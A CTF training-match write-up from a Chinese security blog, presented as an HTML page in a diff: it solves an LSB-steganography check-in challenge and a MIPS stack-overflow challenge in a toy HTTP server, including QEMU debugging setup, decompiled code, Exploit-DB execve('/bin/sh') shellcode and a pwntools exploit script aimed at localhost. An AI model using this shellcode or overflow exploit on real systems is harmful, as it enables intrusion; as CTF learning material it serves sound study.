@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="checkin文件: checkin.png LSB低位隐写，提取出来 XcHVycGxle2V6X2NoMVRWWX3JNZPWKN3GHBRDCOJYGQ3TMZDD303032653732333338636361313061626437387D 后半段 303032653732333338636361313061626437387D 看起来是16进制串，解出来 002e72338cca10a">
+<meta name="keywords" content="1nv0k3r, blog, pwn, binary, exploit, vuln">
+<meta property="og:type" content="article">
+<meta property="og:title" content="训练赛记录">
+<meta property="og:url" content="http://1nv0k3r.me/2019/01/19/训练赛记录/index.html">
+<meta property="og:site_name" content="1nv0k3r&#39;s blog">
+<meta property="og:description" content="checkin文件: checkin.png LSB低位隐写，提取出来 XcHVycGxle2V6X2NoMVRWWX3JNZPWKN3GHBRDCOJYGQ3TMZDD303032653732333338636361313061626437387D 后半段 303032653732333338636361313061626437387D 看起来是16进制串，解出来 002e72338cca10a">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://1nv0k3r.me/2019/01/19/训练赛记录/1.png">
+<meta property="og:image" content="http://1nv0k3r.me/2019/01/19/训练赛记录/2.png">
+<meta property="og:image" content="http://1nv0k3r.me/2019/01/19/训练赛记录/3.png">
+<meta property="og:image" content="http://1nv0k3r.me/2019/01/19/训练赛记录/4.png">
+<meta property="og:image" content="http://1nv0k3r.me/2019/01/19/训练赛记录/5.png">
+<meta property="og:image" content="http://1nv0k3r.me/2019/01/19/训练赛记录/6.png">
+<meta property="og:image" content="http://1nv0k3r.me/2019/01/19/训练赛记录/7.png">
+<meta property="og:updated_time" content="2019-01-24T03:07:56.062Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="训练赛记录">
+<meta name="twitter:description" content="checkin文件: checkin.png LSB低位隐写，提取出来 XcHVycGxle2V6X2NoMVRWWX3JNZPWKN3GHBRDCOJYGQ3TMZDD303032653732333338636361313061626437387D 后半段 303032653732333338636361313061626437387D 看起来是16进制串，解出来 002e72338cca10a">
+<meta name="twitter:image" content="http://1nv0k3r.me/2019/01/19/训练赛记录/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>训练赛记录</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/01/18/如何提高git-clone的速度/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.me/2019/01/19/训练赛记录/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.me/2019/01/19/训练赛记录/&text=训练赛记录"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.me/2019/01/19/训练赛记录/&title=训练赛记录"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.me/2019/01/19/训练赛记录/&is_video=false&description=训练赛记录"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=训练赛记录&body=Check out this article: http://1nv0k3r.me/2019/01/19/训练赛记录/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.me/2019/01/19/训练赛记录/&title=训练赛记录"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.me/2019/01/19/训练赛记录/&title=训练赛记录"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.me/2019/01/19/训练赛记录/&title=训练赛记录"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.me/2019/01/19/训练赛记录/&title=训练赛记录"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.me/2019/01/19/训练赛记录/&name=训练赛记录&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#checkin"><span class="toc-number">1.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN1"><span class="toc-number">2.</span> <span class="toc-text">PWN1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-QEMU-MIPS调试环境搭建"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 QEMU MIPS调试环境搭建</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        训练赛记录
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">1nv0k3r's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-01-19T08:06:50.000Z" itemprop="datePublished">2019-01-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><p>文件: <a href="https://github.com/Inv0k3r/pwnable_files/raw/master/checkin.png">checkin.png</a></p>
+<p>LSB低位隐写，提取出来</p>
+<p><code>XcHVycGxle2V6X2NoMVRWWX3JNZPWKN3GHBRDCOJYGQ3TMZDD303032653732333338636361313061626437387D</code></p>
+<p>后半段 <code>303032653732333338636361313061626437387D</code> 看起来是16进制串，解出来 <code>002e72338cca10abd78}</code></p>
+<p>中段 <code>MVRWWX3JNZPWKN3GHBRDCOJYGQ3TMZDD</code> 是base32： <code>eck_in_e7f8b198476dc</code></p>
+<p>首段看起来是base64，解不出来，猜测是 <code>purple{ch</code></p>
+<p>用base64以后是 <code>cHVycGxle2No</code></p>
+<p>跟 <code>XcHVycGxle2V6X2No</code> 比较，看起来多了个X</p>
+<p>解出来 <code>purple{ez_ch</code></p>
+<p>结果：<code>purple{ez_check_in_e7f8b198476dc002e72338cca10abd78}</code></p>
+<h1 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h1><p>文件在这里下载: <a href="https://github.com/Inv0k3r/pwnable_files/raw/master/bin.233">bin.233</a></p>
+<p>题目给了一个binfile， checksec</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">mips-32-big</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="literal">No</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">disabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br><span class="line"><span class="attr">RWX:</span>      <span class="string">Has</span> <span class="string">RWX</span> <span class="string">segments</span></span><br></pre></td></tr></table></figure>
+<p>fine…mips环境搞起来</p>
+<h2 id="0x01-QEMU-MIPS调试环境搭建"><a href="#0x01-QEMU-MIPS调试环境搭建" class="headerlink" title="0x01 QEMU MIPS调试环境搭建"></a>0x01 QEMU MIPS调试环境搭建</h2><p>下载虚拟机和内核文件 <code>https://people.debian.org/~aurel32/qemu/mips/</code></p>
+<p>这里下载 <code>debian_wheezy_mips_standard.qcow2</code> 和 <code>vmlinux-3.2.0-4-4kc-malta</code></p>
+<p>我宿主机是Vmware的Ubuntu 16.04, 在里面开qemu虚拟机, 采用网桥的方式建立MIPS虚拟机和Ubuntu的连接</p>
+<p>安装QEMU: </p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">apt-get <span class="keyword">install</span> -y qemu qemu-<span class="keyword">user</span>-<span class="keyword">static</span> qemu-<span class="keyword">system</span></span><br></pre></td></tr></table></figure>
+<p>下载虚拟机和内核文件</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>people.debian.org<span class="regexp">/~aurel32/</span>qemu<span class="regexp">/mips/</span>debian_wheezy_mips_standard.qcow2 &amp;&amp;</span><br><span class="line">wget https:<span class="regexp">//</span>people.debian.org<span class="regexp">/~aurel32/</span>qemu<span class="regexp">/mips/</span>vmlinux-<span class="number">3.2</span>.<span class="number">0</span>-<span class="number">4</span>-<span class="number">4</span>kc-malta</span><br></pre></td></tr></table></figure>
+<p>然后，虚拟机，启动！</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mips \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_wheezy_mips_standard.qcow2 \</span><br><span class="line">    -append <span class="string">"root=/dev/sda1 console=tty0"</span> \</span><br><span class="line">    -netdev user,<span class="attribute">id</span>=net0 \</span><br><span class="line">    -device e1000,<span class="attribute">netdev</span>=net0,id=net0,mac=52:54:00:c9:18:27 \</span><br><span class="line">    -net<span class="built_in"> user </span>-redir tcp:2222::2222 \</span><br><span class="line">    -gdb tcp::22333 \</span><br><span class="line">    -redir tcp:1234::1234 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>
+<p>账号密码都是root, 然后添加了端口映射, 便于在Ubuntu里调试</p>
+<p>给Ubuntu安装pwndbg和调试MIPS的插件：<br><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/pwndbg/pwndbg &amp;&amp;</span><br><span class="line"><span class="keyword">cd</span> pwndbg &amp;&amp;</span><br><span class="line">sudo bash setup.<span class="keyword">sh</span> &amp;&amp;</span><br><span class="line">sudo apt install gdb-multiarch</span><br></pre></td></tr></table></figure></p>
+<p>关于调试:</p>
+<p>我在qemu虚拟机里装了gdb和socat, 即:</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> install gdb socat</span><br></pre></td></tr></table></figure>
+<p>然后把要调试的文件传到了免费网盘github, 之后通过wget下载到qemu虚拟机中</p>
+<p>然后用socat启动gdb调试, 这里的1234端口是上面启动虚拟机的时候设置的端口映射</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">socat</span> <span class="selector-tag">TCP-LISTEN</span><span class="selector-pseudo">:1234</span>,<span class="selector-tag">reuseaddr</span>,<span class="selector-tag">fork</span> <span class="selector-tag">EXEC</span><span class="selector-pseudo">:"gdb</span> <span class="selector-tag">bin</span><span class="selector-class">.233</span>"</span><br></pre></td></tr></table></figure>
+<p>这样我们在Ubuntu机里就可以用 <code>nc 127.0.0.1 1234</code> 进行连接</p>
+<p>输入payload可以用python脚本配合pwntools</p>
+<p>如:<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = remote('<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>', <span class="number">1234</span>)</span><br></pre></td></tr></table></figure></p>
+<p>后面的操作就相当于开了一个远程调试的gdb, 直接用pwntools发送指令即可, 比如查看栈内存:</p>
+<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">r</span><span class="selector-class">.sendline</span>(<span class="string">'x/100wx $sp'</span>)</span><br></pre></td></tr></table></figure>
+<p>蛋疼的是mips虚拟机里没法装pwndbg之类的工具, 只能用原始的gdb来调, 不过足够了</p>
+<p>main函数:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> param0, <span class="keyword">unsigned</span> <span class="keyword">int</span> param1)</span> </span>&#123;</span><br><span class="line">    setvbuf(*gvar_411214, <span class="number">6</span>, <span class="number">2</span>, <span class="number">6</span>);</span><br><span class="line">    setvbuf(**&amp;gvar_411208, <span class="number">6</span>, <span class="number">2</span>, <span class="number">6</span>);</span><br><span class="line">    param0 = *&amp;gvar_4111D4 + <span class="number">4448</span>;</span><br><span class="line">    <span class="keyword">char</span> *v0 = getenv(<span class="string">"PWD"</span>);</span><br><span class="line">    *&amp;ROOT = v0;</span><br><span class="line">    menu(param0, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i) &#123;</span><br><span class="line">        respond(param0, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>menu函数:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">menu</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> param0, <span class="keyword">unsigned</span> <span class="keyword">int</span> param1, <span class="keyword">unsigned</span> <span class="keyword">int</span> param2, <span class="keyword">unsigned</span> <span class="keyword">int</span> param3)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"pwd"</span>, param1, param2, param3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"start?"</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, *&amp;gvar_4111D8, <span class="number">1</span>, param3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>respond函数:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">respond</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> param0, <span class="keyword">unsigned</span> <span class="keyword">int</span> param1, <span class="keyword">unsigned</span> <span class="keyword">int</span> param2, <span class="keyword">unsigned</span> <span class="keyword">int</span> param3)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(gvar_4111D8, <span class="number">0</span>, <span class="number">4096</span>, param3);</span><br><span class="line">    <span class="keyword">int</span> result = read(<span class="number">0</span>, mesg, <span class="number">4096</span>, param3);</span><br><span class="line">    <span class="keyword">int</span> v0 = result;</span><br><span class="line">    <span class="keyword">if</span>(result == <span class="number">0</span>) &#123;</span><br><span class="line">        result = fwrite(<span class="string">"Client disconnected upexpectedly.\n"</span>, <span class="number">1</span>, <span class="number">34</span>, **&amp;gvar_41123C);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(result &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        result = fwrite(<span class="string">"recv() error\n"</span>, <span class="number">1</span>, <span class="number">13</span>, **&amp;gvar_41123C);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">// len(result) &gt; 0, 有输入</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>, mesg, <span class="number">4096</span>, param3);</span><br><span class="line">        result = strtok(mesg, <span class="string">" \t\n"</span>, <span class="number">4096</span>, param3); <span class="comment">// 用" \t\n"切割字符串</span></span><br><span class="line">        result = <span class="built_in">strncmp</span>(result, <span class="string">"GET"</span>, <span class="number">4</span>, param3); <span class="comment">// 比较前4个字符</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(result == <span class="number">0</span>) &#123;</span><br><span class="line">            result = strtok(mesg, <span class="string">" \t"</span>, <span class="number">4</span>, param3); <span class="comment">// 用" \t"切割字符串</span></span><br><span class="line">            <span class="keyword">char</span> *filename = result;</span><br><span class="line">            result = strtok(mesg, <span class="string">" \t\n"</span>, <span class="number">4</span>, param3); <span class="comment">// 用" \t\n"切割字符串</span></span><br><span class="line">            <span class="keyword">char</span> *protocol = result;</span><br><span class="line">            result = <span class="built_in">strncmp</span>(protocol, <span class="string">"HTTP/1.0"</span>, <span class="number">8</span>, param3); <span class="comment">// 比较前8个字符</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(result != <span class="number">0</span>) &#123;</span><br><span class="line">                result = <span class="built_in">strncmp</span>(protocol, <span class="string">"HTTP/1.1"</span>, <span class="number">8</span>, param3); <span class="comment">//比较</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(result != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"HTTP/1.0 400 Bad Request\n"</span>, <span class="number">25</span>, param3);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            result = <span class="built_in">strncmp</span>(filename, <span class="string">"/"</span>, <span class="number">2</span>, param3);</span><br><span class="line">            <span class="keyword">if</span>(result == <span class="number">0</span>) &#123;</span><br><span class="line">                filename = <span class="string">"/index.html"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            env_str = *&amp;ROOT;</span><br><span class="line">            <span class="built_in">strcpy</span>(&amp;path, env_str); <span class="comment">// path = /home/fish</span></span><br><span class="line">            result = <span class="built_in">strlen</span>(*&amp;R00T, env_str, <span class="number">2</span>, param3); <span class="comment">// 路径的长度</span></span><br><span class="line">            <span class="built_in">strcpy</span>(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(result + ((<span class="keyword">int</span>)(&amp;path)))), filename, <span class="number">2</span>, param3); <span class="comment">// 字符串拼接 path = /home/fish + v1</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"file: %s\n"</span>, &amp;path, <span class="number">2</span>, param3); <span class="comment">// 输出path</span></span><br><span class="line">            result = open(&amp;path, <span class="number">0</span>, <span class="number">2</span>, param3); <span class="comment">// 打开path指向的文件</span></span><br><span class="line">            <span class="comment">// 文件存在则输出200 OK, 否则404</span></span><br><span class="line">            result = result != <span class="number">-1</span> ? write(l, <span class="string">"HTTP/1.0 200 0K\n\n"</span>, <span class="number">17</span>, param3): write(<span class="number">1</span>, <span class="string">"HTTP/1.0 404 Not Found\n"</span>, <span class="number">23</span>, param3);    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>输入的HTTP请求段mesg:</p>
+<p>GET /{file} HTTP/1.0</p>
+<p><img src="/2019/01/19/训练赛记录/1.png" alt="img"></p>
+<p>可以看到栈里的数据, strcpy复制的时候没检查长度造成栈溢出, 测得保存的文件路径在$sp + 0x2c处(本机测试的时候路径是/root)</p>
+<p><img src="/2019/01/19/训练赛记录/2.png" alt="img"></p>
+<p>$ra(返回地址寄存器)保存在$sp + 0x134处</p>
+<p><img src="/2019/01/19/训练赛记录/3.png" alt="img"><br><img src="/2019/01/19/训练赛记录/4.png" alt="img"></p>
+<p>/bin/sh也有了, system也有了</p>
+<p><img src="/2019/01/19/训练赛记录/5.png" alt="img"></p>
+<p><img src="/2019/01/19/训练赛记录/6.png" alt="img"></p>
+<p>看起来是要构造ROP, 但是有一个问题是, payload里不能有\x00不然会截断</p>
+<p>但是所有地址都是0x0040开头的, 所以没法构造ROP</p>
+<p>本来跳转到 0x00400e68, 现在跳转到 0x7fff6b5a, a(1000b) 最低两个有效位有一个不是0</p>
+<p>尝试把shellcode写到栈上然后控制$ra跳转过去</p>
+<p>在Exploit-DB上找了个mips 32 big endian的shellcode</p>
+<pre><code>shellcode  = &quot;\x28\x06\xff\xff&quot;      #  /* slti    a2,zero,-1   */
+shellcode += &quot;\x3c\x0f\x2f\x2f&quot;      #  /* lui     t7,0x2f2f    */
+shellcode += &quot;\x35\xef\x62\x69&quot;      #  /* ori     t7,t7,0x6269 */
+shellcode += &quot;\xaf\xaf\xff\xf4&quot;      #  /* sw      t7,-12(sp)   */
+shellcode += &quot;\x3c\x0e\x6e\x2f&quot;      #  /* lui     t6,0x6e2f    */
+shellcode += &quot;\x35\xce\x73\x68&quot;      #  /* ori     t6,t6,0x7368 */
+shellcode += &quot;\xaf\xae\xff\xf8&quot;      #  /* sw      t6,-8(sp)    */
+shellcode += &quot;\xaf\xa0\xff\xfc&quot;      #  /* sw      zero,-4(sp)  */
+shellcode += &quot;\x27\xa4\xff\xf4&quot;      #  /* addiu   a0,sp,-12    */
+shellcode += &quot;\x28\x05\xff\xff&quot;      #  /* slti    a1,zero,-1   */
+shellcode += &quot;\x24\x02\x0f\xab&quot;      #  /* li      v0,4011      */
+shellcode += &quot;\x01\x01\x01\x0c&quot;      #  /* syscall 0x40404      */
+</code></pre><p>看一下函数返回的操作</p>
+<pre><code>  break         $sp        $ra          code
+0x00400CC0  0x7fff6bd8  0x00400c9c  jalr    $t9 ; strcpy                # 这条指令将执行strcpy
+0x00400CC4  0x7fff6bd8  0x00400cc8  nop
+0x00400CC8  0x7fff6bd8  0x00400cc8  lw      $gp, 0x138+var_128($fp)     # strcpy后第一条指令
+----------
+0x00400D7C  0x7fff6bd8  0x00400d70  lw      $ra, 0x138+var_4($sp)       # 这里修改了$ra, 我们溢出到栈上覆盖了这个地址后, $ra的值是我们伪造的地址
+0x00400D80  0x7fff6bd8  0x00400e68  lw      $fp, 0x138+var_8($sp)       # 这里伪造的$ra=0x7fff6b5a
+0x00400D84  0x7fff6bd8  0x00400e68  addiu   $sp, 0x138                  # $ra=0x7fff6b5a
+0x00400D88  0x7fff6d10  0x00400e68  jr      $ra                         # 跳转回main
+</code></pre><p>直接修改$ra 跳过去就可以, 修改$ra为0x7fff6b5a</p>
+<p>测试完以后发现, 会报</p>
+<pre><code>Program received signal SIGBUS, Bus error.
+GDB is unable to find the start of the function at 0x7fff6b5a
+and thus can&apos;t determine the size of that function&apos;s stack frame.
+This means that GDB may be unable to access that stack frame, or
+the frames below it.
+This problem is most likely caused by an invalid program counter or
+stack pointer.
+However, if you think GDB should simply search farther back
+from 0x7fff6b5a for code which looks like the beginning of a
+function, you can increase the range of the search using the `set
+heuristic-fence-post&apos; command.
+0x7fff6b5a in ?? ()
+</code></pre><p>猜测可能是MIPS需要对齐地址, $sp = 0x7fff6bd8, 所以应该按4字节增长, 设置$ra = $sp + 4 * n</p>
+<p>但是实际运行环境的$sp不知道, 得想办法解决一哈</p>
+<p>调试环境测试跳转到shellcode可以稳定getshell</p>
+<p><img src="/2019/01/19/训练赛记录/7.png" alt="img"></p>
+<p>先给出exp…等我想办法找到栈地址再补充</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode  = <span class="string">"\x28\x06\xff\xff"</span>      <span class="comment">#  /* slti    a2,zero,-1   */</span></span><br><span class="line">shellcode += <span class="string">"\x3c\x0f\x2f\x2f"</span>      <span class="comment">#  /* lui     t7,0x2f2f    */</span></span><br><span class="line">shellcode += <span class="string">"\x35\xef\x62\x69"</span>      <span class="comment">#  /* ori     t7,t7,0x6269 */</span></span><br><span class="line">shellcode += <span class="string">"\xaf\xaf\xff\xf4"</span>      <span class="comment">#  /* sw      t7,-12(sp)   */</span></span><br><span class="line">shellcode += <span class="string">"\x3c\x0e\x6e\x2f"</span>      <span class="comment">#  /* lui     t6,0x6e2f    */</span></span><br><span class="line">shellcode += <span class="string">"\x35\xce\x73\x68"</span>      <span class="comment">#  /* ori     t6,t6,0x7368 */</span></span><br><span class="line">shellcode += <span class="string">"\xaf\xae\xff\xf8"</span>      <span class="comment">#  /* sw      t6,-8(sp)    */</span></span><br><span class="line">shellcode += <span class="string">"\xaf\xa0\xff\xfc"</span>      <span class="comment">#  /* sw      zero,-4(sp)  */</span></span><br><span class="line">shellcode += <span class="string">"\x27\xa4\xff\xf4"</span>      <span class="comment">#  /* addiu   a0,sp,-12    */</span></span><br><span class="line">shellcode += <span class="string">"\x28\x05\xff\xff"</span>      <span class="comment">#  /* slti    a1,zero,-1   */</span></span><br><span class="line">shellcode += <span class="string">"\x24\x02\x0f\xab"</span>      <span class="comment">#  /* li      v0,4011      */</span></span><br><span class="line">shellcode += <span class="string">"\x01\x01\x01\x0c"</span>      <span class="comment">#  /* syscall 0x40404      */</span></span><br><span class="line"></span><br><span class="line">shellcode_addr = <span class="string">''</span></span><br><span class="line">shellcode_addr = <span class="string">"\x7f\xff\x6b\x50"</span>  <span class="comment">#  shellcode的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a'</span> + shellcode + <span class="string">'a'</span> * (<span class="number">253</span> - len(shellcode) - <span class="number">5</span>) + <span class="string">'/123'</span> + shellcode_addr</span><br><span class="line"></span><br><span class="line">http = <span class="string">'GET '</span> + payload + <span class="string">' HTTP/1.1'</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'127.0.0.1'</span>, <span class="number">1234</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'r'</span>) <span class="comment"># gdb run</span></span><br><span class="line">r.recv()        <span class="comment"># start?</span></span><br><span class="line">r.send(<span class="string">'\n'</span>)</span><br><span class="line">r.sendline(http)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>题目本身简单..保护全关, 但是麻烦的地方就是调试环境, 一开始用qemu共享库起, 报段错误, 无法运行</p>
+<p>m4x师傅给了我一个docker: <a href="https://github.com/Inv0k3r/multiarch-docker">multiarch-docker</a></p>
+<p>能运行了但是一调试就炸…最后没办法了才直接在虚拟机里跑, 装个gdb然后端口映射233</p>
+
+      <script>
+        window.disqusProxy={
+          shortname: '1nv0k3r',
+          username: '1nv0k3r',
+          server: 'disqus.1nv0k3r.me',
+          port: 5509,
+          adminAvatar: '/avatars/admin-avatar.jpg',
+          identifier: '2019/01/19/训练赛记录/',
+        };
+        window.disqus_config = function () {
+          this.page.url = window.location.href;
+          this.page.identifier = window.disqusProxy.identifier;
+        };
+      </script>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        
+      <script src="//cdn.bootcss.com/react/16.0.0/umd/react.production.min.js"></script>
+      <script src="//cdn.bootcss.com/react-dom/16.0.0/umd/react-dom.production.min.js"></script>
+      <script src="//cdn.bootcss.com/fetch/2.0.3/fetch.min.js"></script>
+      <script src="//cdn.jsdelivr.net/npm/blockies-identicon@0.1.0/blockies.min.js"></script>
+      <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+      <div id="disqus_proxy_thread"><script src="/scripts/hexo-disqus-proxy-primary.js" async></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
